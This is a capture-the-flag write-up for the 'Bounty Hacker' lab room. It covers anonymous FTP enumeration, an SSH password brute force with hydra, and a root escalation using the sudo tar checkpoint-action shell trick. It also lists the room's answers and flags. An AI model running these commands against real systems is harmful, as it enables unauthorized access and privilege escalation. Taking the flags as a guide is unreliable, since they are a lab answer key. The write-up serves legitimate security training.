## Room: Bounty Hacker 

##### Description:    You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! 

#### Difficulty: Easy

## Recon & Enumeration

All ports tcp scan:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- In this room the questions are providing a lot of help, I start to enumerate the port 21 (FTP) using the anonymous login.


```
ftp 10.10.10.10
Name (10.10.2.38:root): anonymous
    230 Login successful.
ftp> ls
    -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
    -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
ftp> get locks.txt
ftp> get task.txt
```

- Back on my machine I can look at the content of the files, there is a wordlist containing passwords and a text containing a user.

*Who wrote the task list?*
**Q3** - `lin`


## Exploitation

- There are only 3 open ports so I guess that the service we want to bruteforce is probably going to be SSH

*What service can you bruteforce with the text file found?*
**Q4** - `SSH`

- Let's bruteforce it then !

```
hydra -l lin -P locks.txt -f 10.10.10.10 ssh
[22][ssh] host: 10.10.132.146   login: lin   password: RedDr4gonSynd1cat3
```

*What is the users password?*
**Q5** - `RedDr4gonSynd1cat3`

- Having the user and the password I can authenticate using SSH and retrieve the user.txt file

*user.txt*
**Q6** - `THM{CR1M3_SyNd1C4T3}`


## Privilege escalation

- Having a foothold on the machine I start to enumerate, when listing available permissions with root I find an interesting binary.

```
lin@ip-10-10-10-10:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on ip-10-10-10-10:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-10-10-10:
    (root) /bin/tar
lin@ip-10-10-10-10:~/Desktop$
```

- Searching the name of the binary on gtfobins is a good habit to have when doing privilege escalation. I find an easy way to escalate privileges `https://gtfobins.github.io/gtfobins/tar/#sudo`.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- One command later and we are root.

*root.txt*
**Q7** - `THM{80UN7Y_h4cK3r}`


### Date: 27/10/2025
